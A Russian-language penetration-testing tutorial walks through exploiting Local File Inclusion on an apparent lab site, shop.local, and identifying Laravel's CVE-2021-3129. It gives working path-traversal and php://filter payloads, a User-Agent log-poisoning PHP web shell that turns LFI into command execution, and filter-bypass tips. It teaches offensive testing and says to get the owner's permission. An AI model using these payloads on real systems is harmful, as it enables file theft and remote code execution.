## Задача

Мы нашли поверхность и API. Но самые опасные баги живут глубже: там, где приложение **доверяет пути к файлам** и **версии своих библиотек**. Включение файлов (LFI) и известные CVE фреймворков часто превращают безобидную страницу в чтение секретов и выполнение кода.

Разберём один кейс: от параметра URL до чтения чужого файла и до RCE.

## Наш пример: `?page=` в shop.local

На сайте есть навигация по страницам. Заметим параметр в URL:

```bash
$ curl -s 'https://shop.local/index.php?page=about' | grep -o 'About Us'
About Us
```

Параметр `page=about` управляет тем, какой файл подставляется. Значит, за кулисами есть что-то вроде `include($_GET['page'] . '.php')`. Проверим гипотезу подстановкой пути к системному файлу:

```bash
$ curl -s 'https://shop.local/index.php?page=../../../../etc/passwd%00'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Мы прочитали `/etc/passwd`. Это **LFI** (Local File Inclusion) — включение локального файла. Символ `%00` (нулевой байт) отрезал добавляемый суффикс `.php`. Фильтра на `../` нет — классика.

> **LFI** — когда приложение подставляет в путь пользовательский ввод и отдаёт/исполняет указанный файл. Если файл только читается — это утечка; если исполняется (например, PHP) — это уже RCE.

## Шаг 1: почему сработало `../`

`../` — переход на уровень выше в файловой системе. Пять таких переходов выводят из `/var/www/shop/public` в `/`. Мы знаем абсолютный путь из предыдущего урока (`DOCUMENT_ROOT: /var/www/shop/public`), поэтому считаем глубину точно. Если `%00` отфильтрован, ищем обходы:

```bash
$ curl -s 'https://shop.local/index.php?page=....//....//....//etc/passwd'
$ curl -s 'https://shop.local/index.php?page=/etc/passwd'
$ curl -s 'https://shop.local/index.php?page=php://filter/convert.base64-encode/resource=index'
PD9waHAgaW5jbHVkZSgkX0dFVFsncGFnZSddIC4gJy5waHAnKTs...
```

Последний вариант — **PHP-обёртка** `php://filter`: она не исполняет файл, а кодирует его в base64. Мы получили исходник `index.php` в обход фильтров на `../`.

## Шаг 2: LFI → RCE через лог-файл

Читать файлы хорошо, но цель — код. Классический приём: пишем PHP-код в файл, который сервер точно логирует, затем «включаем» этот лог. Например, лог доступа nginx содержит наш `User-Agent`:

```bash
$ curl -s 'https://shop.local/' -A '<?php system($_GET["c"]); ?>'
$ curl -s 'https://shop.local/index.php?page=/var/log/nginx/access.log&c=id'
... 10.0.0.9 - - "<?php system($_GET["c"]); ?>" 200 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

PHP исполнил код из лога — мы получили **RCE от имени `www-data`**. Это и есть «глубокий класс»: один параметр превратился в выполнение команд.

## Шаг 3: известные CVE фреймворков

Второй глубокий класс — уязвимости самой платформы. Мы уже видели `X-Powered-By: PHP/7.4.33`. Версия — это ключ к CVE. Смотрим, что за фреймворк, по заголовкам и путям:

```bash
$ curl -sI https://shop.local/ | grep -i 'set-cookie\|x-'
Set-Cookie: laravel_session=...
X-Powered-By: PHP/7.4.33
```

`laravel_session` выдаёт фреймворк — Laravel. Дальше смотрим его версию и известные баги. Быстрее всего — шаблонным сканером по содержимому, а не перебором имён:

```bash
$ nuclei -u https://shop.local -tags cve -severity critical,high -silent
[laravel-debug-enabled] [http] [medium] https://shop.local/_ignition/health-check
[CVE-2021-3129] [http] [critical] https://shop.local/_ignition/execute-solution
```

`CVE-2021-3129` — Laravel Ignition RCE (при включённом debug). Версия + путь `/_ignition/` = готовый эксплойт. Это не LFI, но тот же принцип: **точная версия + известная уязвимость = RCE**.

## Шаг 4: сводим к архитектуре

| Класс | Что доверяем | Признак |
|-------|--------------|---------|
| LFI | путь к файлу из ввода | `?page=`, `?file=`, `?template=` |
| LFI→RCE | лог/сессия как «склад» кода | запись PHP в лог |
| CVE фреймворка | версия библиотеки | `X-Powered-By`, cookie, `/_ignition/` |

Оба класса бьют по одному — доверию: приложение верит, что `page` всегда имя страницы, а библиотека всегда свежая.

## Шаг 5: от версии к точному PoC

Мало увидеть `Laravel` — нужна точная версия, иначе эксплойт не сработает. Мы уже выкачали `.git` в прошлом уроке, значит есть `composer.lock`:

```bash
$ jq -r '.packages[] | select(.name=="laravel/framework") | .version' shop-src/composer.lock
8.4.2
$ jq -r '.packages[] | select(.name=="facade/ignition") | .version' shop-src/composer.lock
2.0.0
```

`facade/ignition 2.0.0` + включённый `APP_DEBUG=true` — это ровно условие `CVE-2021-3129`. Проверяем безопасно, без вредоносного payload — читаем несуществующий файл, чтобы увидеть обработчик:

```bash
$ curl -s https://shop.local/_ignition/health-check
{"can_execute_commands":true}
```

Ответ `can_execute_commands:true` подтверждает уязвимость без запуска команд. Только после этого (и с разрешения владельца) подставляют payload. Такой порядок — **сначала подтверди, потом эксплуатируй** — отличает пентест от бездумного запуска эксплойтов.

## Если не сработало

- **`../` вырезается** — используй `....//`, двойное URL-кодирование `%252e%252e`, или `php://filter`.
- **Лог не читается** — пиши в другие места: `/proc/self/environ` (через `User-Agent`), сессионные файлы, `/tmp`.
- **`%00` не работает** — на PHP ≥ 5.3.4 нулевой байт в `include` не обрезает; ищи другую обёртку.
- **CVE не подтверждается** — проверь точную версию (`composer.lock` в утёкшем `.git`) прежде чем гнать эксплойт.

## Что мы теперь знаем

- LFI — подстановка пути; читается через `../`, `php://filter`, обходы фильтров.
- LFI становится RCE, если сервер исполняет подставленный файл (лог, сессия).
- Точная версия фреймворка — ключ к CVE; ищи её в заголовках и cookie.
- `nuclei -tags cve` закрывает «известное» по содержимому, не по имени продукта.

## Частые вопросы

**LFI и path traversal — это одно и то же?** Почти: traversal — чтение файла по пути, LFI — **включение** файла в логику приложения. Если файл исполняется (PHP), LFI ведёт к RCE.

**Всегда ли LFI даёт RCE?** Нет, но часто: через лог, сессию, `/proc/self/environ` или обёртки. Даже без RCE это утечка конфигов и кредов.

**Что такое обёртки PHP?** Псевдо-протоколы (`php://filter`, `php://input`, `data://`), которые меняют, как читается/исполняется файл. `php://filter` удобен для чтения исходников в base64.

**Почему версия фреймворка так важна?** Потому что CVE привязан к версии. Без точной версии эксплойт может не сработать — а с версией ты берёшь готовый PoC.

**Как безопасно проверить CVE?** Сначала «безвредный» маркер: чтение несуществующего файла, ответ `can_execute_commands`, DNS-запрос. RCE — только с разрешения.

**Где искать точную версию?** В заголовках (`X-Powered-By`), cookie фреймворка, путях (`/_ignition/`), а если утёк `.git` — в `composer.lock`/`package.json`.

## Ещё один сценарий: путь из утёкшего исходника

Раз мы выкачали `.git`, исходники лежат локально. Ищем опасные включения прямо в коде:

```bash
$ grep -rn 'include\|require' shop-src/*.php | grep '\$_'
shop-src/index.php:12: include($_GET['page'] . '.php');
shop-src/view.php:8:  include('templates/' . $_GET['t']);
```

Два параметра, оба попадают в `include`. Проверяем второй:

```bash
$ curl -s 'https://shop.local/view.php?t=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
```

Исходники подсказывают **все** точки LFI, а не только найденную случайно. Так утёкший `.git` ускоряет атаку.

## На что смотреть дальше

- **Параметры-пути.** `page`, `file`, `template`, `include`, `view`, `lang` — кандидаты на LFI.
- **Обёртки.** Пробуй `php://filter`, `data://`, `expect://` — они расширяют чтение.
- **Абсолютный путь.** Если знаешь `DOCUMENT_ROOT`, считай глубину `../` точно.
- **Логи и сессии.** Пиши код в лог (`User-Agent`) и включай его — LFI→RCE.
- **Версии.** Точная версия фреймворка → известный CVE → готовый PoC.
- **Подтверждение.** Сначала безвредный маркер, потом эксплуатация.

## Куда дальше
